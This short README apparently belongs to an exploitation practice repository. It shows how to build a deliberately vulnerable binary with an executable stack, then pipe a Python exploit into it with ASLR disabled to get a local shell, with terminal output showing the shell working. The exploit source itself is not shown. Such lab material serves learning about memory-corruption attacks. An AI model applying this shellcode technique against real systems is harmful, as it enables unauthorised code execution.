## How to run

1. build

```make
make build
```
2. send payload (disables ASLR for the process first)
```shell
(python3 exploit.py; cat) | setarch $(uname -m) -R ./vuln 
```
note: you may need to disable stack canaries


### out

```shell
┌──(kali㉿kali)-[~/…/github.com/JamesAri/a-void/rwx_stack]
└─$ make build
gcc -z execstack -std=gnu89 -c main.c

    ...
    
┌──(kali㉿kali)-[~/…/github.com/JamesAri/a-void/rwx_stack]
└─$ (python3 exploit.py; cat) |  setarch $(uname -m) -R ./vuln

ls
Makefile  exploit.py  main.c  main.o  readme.md  vuln
whoami
kali
```
